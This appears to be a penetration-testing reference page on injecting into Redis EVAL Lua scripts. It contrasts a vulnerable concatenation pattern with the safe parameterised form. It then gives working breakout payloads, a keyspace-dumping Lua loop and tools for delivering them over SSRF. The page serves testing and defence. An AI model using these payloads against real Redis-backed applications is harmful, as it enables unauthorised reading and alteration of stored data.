---
title: "EVAL: injecting into server-side Lua scripts"
description: "EVAL runs a Lua script inside Redis; injecting into the script body or its arguments lets an attacker drive redis.call() and reach every key server-side."
keywords:
  - EVAL
  - Redis Lua injection
  - redis.call
  - Lua sandbox
  - KEYS ARGV
---

# EVAL

`EVAL` runs a Lua script on the Redis server. Its shape is `EVAL <script> <numkeys> [key ...] [arg ...]`: the script text, a count of key arguments, then the keys (available in Lua as `KEYS[1..n]`) and extra arguments (`ARGV[1..n]`). The script executes atomically and can call back into Redis through `redis.call()` and `redis.pcall()`.

## Vulnerable pattern

Injection appears when application code builds the **script body** from user input instead of passing that input as `ARGV`:

```python
# user_val concatenated into the script text
script = "return redis.call('GET', '" + user_val + "')"
r.eval(script, 0)
```

The safe form keeps the script constant and binds the value: `r.eval("return redis.call('GET', KEYS[1])", 1, user_val)`. The injectable form lets `user_val` close the string literal and append Lua.

## Breaking out of the script

Because the value lands inside a single-quoted Lua string, a quote closes it and the rest is parsed as Lua. The script must stay one valid chunk: a second bare `return` will not compile, so chain onto the original `return` with a Lua operator (`or`, `..`) and end with a `--` line comment to discard the trailing part of the original script:

```lua
x') or redis.call('KEYS', '*') --
```

This parses as `return redis.call('GET','x') or redis.call('KEYS','*')`: the GET misses and returns false, so the second call runs and its result is returned. The `or` chain reaches any command scripts are permitted to run:

```lua
x') or redis.call('MGET', unpack(redis.call('KEYS','*'))) --
```

Some administrative commands are flagged **no-script** and are rejected inside `EVAL`, including `CONFIG`. The write-to-disk chain in [CONFIG SET abuse](../config-set-abuse.md) therefore cannot run from Lua; it needs direct command execution.

## Reading and exfiltrating in bulk

Lua loops let one script sweep the keyspace and return everything in a single response, efficient blind-free extraction:

```lua
return redis.call('KEYS', '*')
```

```lua
local out = {}
for _, k in ipairs(redis.call('KEYS', '*')) do
  out[#out+1] = k .. '=' .. tostring(redis.call('GET', k))
end
return out
```

A fully attacker-supplied `EVAL` (for example over an SSRF-smuggled connection, see [Command injection](../command.md)) can carry this as its whole body.

## Sandbox notes

The Lua environment is sandboxed: `os`, `io`, and `loadfile` are removed or restricted, and globals are frozen, so direct shell execution from Lua is not the intended path. Impact instead comes from `redis.call()` reaching the data-plane commands (`KEYS`, `MGET`, `GET`, `SET`, `SCAN`), which read and rewrite every key server-side. The administrative commands that drive the disk-write RCE chain (`CONFIG`, `DEBUG`, `SLAVEOF`/`REPLICAOF`) are flagged no-script and are rejected from inside a script, so that route needs direct command execution, not Lua. The sandbox has historically been escaped on specific versions through interpreter bugs, but the version-independent primitive is simply full data-command access through `redis.call()`. `redis.call()` raises on error and aborts the script; `redis.pcall()` returns the error as a table, useful when probing which commands are permitted without killing the script.

## Tools

- **redis-cli**: run EVAL payloads and inspect returned results.
- **Gopherus**: smuggle a full EVAL body over an SSRF RESP connection.
- **Burp Repeater**: deliver the script-body breakout through the parameter.

## References

- [Redis: EVAL](https://redis.io/docs/latest/commands/eval/)
- [Redis: scripting with Lua](https://redis.io/docs/latest/develop/interact/programmability/eval-intro/)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
